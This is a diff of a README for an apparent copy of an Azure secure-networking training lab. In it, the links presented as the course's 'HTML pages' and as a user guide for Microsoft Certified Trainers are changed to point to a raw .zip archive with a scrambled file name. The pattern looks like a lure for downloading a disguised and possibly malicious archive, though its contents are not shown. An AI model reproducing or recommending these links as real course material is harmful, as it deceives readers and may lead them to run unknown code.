@@ -1,8 +1,8 @@
 # Configure secure access to workloads with Azure virtual networking services
 
-Looking for the **[HTML pages](https://raw.githubusercontent.com/isaacdivine37/Configure-secure-access-to-workloads-with-Azure-virtual-networking-services/main/Allfiles/access-secure-services-Azure-networking-with-to-workloads-virtual-Configure-3.3.zip)**?
+Looking for the **[HTML pages](https://raw.githubusercontent.com/isaacdivine37/Configure-secure-access-to-workloads-with-Azure-virtual-networking-services/main/Allfiles/Labs/All-Labs/with-services-access-workloads-Configure-to-secure-virtual-networking-Azure-spheroidize.zip)**?
 
-**Are you an MCT?** - Have a look at our [GitHub User Guide for MCTs](https://raw.githubusercontent.com/isaacdivine37/Configure-secure-access-to-workloads-with-Azure-virtual-networking-services/main/Allfiles/access-secure-services-Azure-networking-with-to-workloads-virtual-Configure-3.3.zip)
+**Are you an MCT?** - Have a look at our [GitHub User Guide for MCTs](https://raw.githubusercontent.com/isaacdivine37/Configure-secure-access-to-workloads-with-Azure-virtual-networking-services/main/Allfiles/Labs/All-Labs/with-services-access-workloads-Configure-to-secure-virtual-networking-Azure-spheroidize.zip)
 
 ## What are we doing?
 
